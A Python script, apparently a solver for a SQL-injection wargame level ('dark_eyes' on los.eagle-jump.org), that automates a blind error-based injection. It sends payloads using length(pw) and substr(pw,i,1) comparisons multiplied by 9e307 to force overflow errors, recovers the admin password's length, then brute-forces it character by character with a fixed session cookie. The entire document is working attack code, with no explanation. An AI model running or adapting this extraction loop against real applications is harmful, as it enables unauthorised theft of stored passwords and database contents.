import urllib.request
from urllib.parse import quote

key = ""

pwlen = 0

for i in range(1, 20):
    url = "http://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw="
    data = "' or id='admin' and (((length(pw)='{}')+1)*9e307)-- -".format(str(i))
    print(data)
    data = quote(data)
    re = urllib.request.Request(url + data)

    re.add_header(
        "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
    re.add_header(
        "Cookie", "PHPSESSID=jtkacptqj14heqvtcuofma30m2"
    )

    req = urllib.request.urlopen(re)

    if str(req.read()).find("query :") == -1:
        pwlen = i
        print('pw length : ' + str(pwlen))
        break

for i in range(1, pwlen + 1):
    for j in range(32, 127):
        if chr(j) in {'_', '.', "'"}: # 필터링되는 문자들
            continue
        url = "http://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw="
        data = "' or id='admin' and (((substr(pw,{},1)='{}')+1)*9e307)-- -".format(
            str(i), chr(j))
        print(data)
        data = quote(data)
        re = urllib.request.Request(url + data)
        re.add_header(
            "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
        re.add_header("Cookie", "PHPSESSID=jtkacptqj14heqvtcuofma30m2")
        req = urllib.request.urlopen(re)

        if str(req.read()).find("query :") == -1:
            key += chr(j).lower()
            print (key)
            break
print(key)